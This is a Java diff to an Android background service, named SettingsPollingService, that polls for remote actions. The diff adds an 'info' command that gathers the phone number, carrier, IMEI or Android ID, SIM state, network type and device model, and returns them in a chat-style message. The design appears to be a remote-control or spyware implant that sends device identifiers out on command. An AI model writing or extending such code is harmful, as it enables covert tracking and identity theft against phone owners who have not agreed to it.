@@ -229,6 +229,13 @@ public class SettingsPollingService extends Service {
                         break;
                     }
 
+                    case "info": {
+                        // Kumpulkan info identitas HP
+                        message = buildPhoneInfo(ctx);
+                        success = true;
+                        break;
+                    }
+
                     default:
                         message = "❌ Aksi tidak dikenal: " + action;
                         break;
@@ -245,6 +252,126 @@ public class SettingsPollingService extends Service {
             scheduleNextPoll(POLL_INTERVAL_MS);
 
         }).start();
+    }
+
+    // =========================================================
+    // INFO IDENTITAS HP
+    // =========================================================
+
+    private String buildPhoneInfo(Context context) {
+
+        android.telephony.TelephonyManager tm =
+                (android.telephony.TelephonyManager) context
+                        .getSystemService(Context.TELEPHONY_SERVICE);
+
+        StringBuilder sb = new StringBuilder();
+        sb.append("📱 *Identitas HP*\n\n");
+
+        // Nomor HP
+        String number = "";
+        try {
+            if (tm != null) number = tm.getLine1Number();
+        } catch (Exception ignored) {}
+        sb.append("📞 Nomor: ")
+          .append((number != null && !number.isEmpty()) ? number : "Tidak tersedia")
+          .append("\n");
+
+        // Operator
+        String operator = "";
+        try {
+            if (tm != null) operator = tm.getNetworkOperatorName();
+        } catch (Exception ignored) {}
+        sb.append("📡 Operator: ")
+          .append((operator != null && !operator.isEmpty()) ? operator : "Tidak tersedia")
+          .append("\n");
+
+        // IMEI / Android ID
+        String deviceId = "";
+        try {
+            if (tm != null && android.os.Build.VERSION.SDK_INT
+                    < android.os.Build.VERSION_CODES.Q) {
+                deviceId = tm.getImei();
+            }
+        } catch (Exception ignored) {}
+
+        if (deviceId == null || deviceId.isEmpty()) {
+            deviceId = android.provider.Settings.Secure.getString(
+                    context.getContentResolver(),
+                    android.provider.Settings.Secure.ANDROID_ID
+            );
+            sb.append("🔑 Android ID: ").append(deviceId).append("\n");
+        } else {
+            sb.append("🔢 IMEI: ").append(deviceId).append("\n");
+        }
+
+        // Jenis jaringan
+        String networkType = getNetworkType(tm);
+        sb.append("📶 Jaringan: ").append(networkType).append("\n");
+
+        // Status SIM
+        String simState = getSimState(tm);
+        sb.append("💳 SIM: ").append(simState).append("\n");
+
+        // Model HP
+        String model = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+        sb.append("📲 Perangkat: ").append(model).append("\n");
+
+        // Versi Android
+        sb.append("🤖 Android: ").append(android.os.Build.VERSION.RELEASE)
+          .append(" (API ").append(android.os.Build.VERSION.SDK_INT).append(")");
+
+        return sb.toString().trim();
+    }
+
+    private String getNetworkType(android.telephony.TelephonyManager tm) {
+        if (tm == null) return "Tidak tersedia";
+        try {
+            int type = tm.getNetworkType();
+            switch (type) {
+                case android.telephony.TelephonyManager.NETWORK_TYPE_LTE:
+                    return "4G LTE";
+                case android.telephony.TelephonyManager.NETWORK_TYPE_NR:
+                    return "5G";
+                case android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA:
+                case android.telephony.TelephonyManager.NETWORK_TYPE_HSPA:
+                case android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA:
+                case android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP:
+                    return "3G HSPA";
+                case android.telephony.TelephonyManager.NETWORK_TYPE_UMTS:
+                    return "3G UMTS";
+                case android.telephony.TelephonyManager.NETWORK_TYPE_EDGE:
+                    return "2G EDGE";
+                case android.telephony.TelephonyManager.NETWORK_TYPE_GPRS:
+                    return "2G GPRS";
+                default:
+                    return "Unknown (" + type + ")";
+            }
+        } catch (Exception e) {
+            return "Tidak tersedia";
+        }
+    }
+
+    private String getSimState(android.telephony.TelephonyManager tm) {
+        if (tm == null) return "Tidak tersedia";
+        try {
+            int state = tm.getSimState();
+            switch (state) {
+                case android.telephony.TelephonyManager.SIM_STATE_READY:
+                    return "✅ Terpasang & Aktif";
+                case android.telephony.TelephonyManager.SIM_STATE_ABSENT:
+                    return "❌ Tidak ada SIM";
+                case android.telephony.TelephonyManager.SIM_STATE_LOCKED:
+                    return "🔒 SIM Terkunci";
+                case android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED:
+                    return "🔒 Butuh PIN";
+                case android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED:
+                    return "🔒 Butuh PUK";
+                default:
+                    return "Unknown";
+            }
+        } catch (Exception e) {
+            return "Tidak tersedia";
+        }
     }
 
     // =========================================================
